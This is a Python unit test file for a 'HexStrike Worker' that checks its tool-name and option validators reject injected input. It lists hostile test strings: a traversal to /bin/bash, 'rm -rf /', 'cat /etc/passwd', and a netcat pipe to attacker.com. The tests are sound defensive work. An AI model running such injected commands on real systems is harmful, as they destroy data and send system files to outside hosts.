#!/usr/bin/env python3
"""Unit tests for HexStrike Worker."""

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from modules.worker.worker import Worker

class TestWorker(unittest.TestCase):
    def setUp(self):
        self.worker = Worker(poll_interval=1)

    def test_validate_tool(self):
        self.assertTrue(self.worker._validate_tool("nmap")[0])
        self.assertFalse(self.worker._validate_tool("")[0])
        self.assertFalse(self.worker._validate_tool("../../bin/bash")[0])
        self.assertFalse(self.worker._validate_tool("nmap; rm -rf /")[0])

    def test_sanitize_options(self):
        self.assertTrue(self.worker._sanitize_options("-sV -T4")[0])
        self.assertFalse(self.worker._sanitize_options("-sV; cat /etc/passwd")[0])
        self.assertFalse(self.worker._sanitize_options("-sV | nc attacker.com 4444")[0])

if __name__ == "__main__":
    unittest.main()
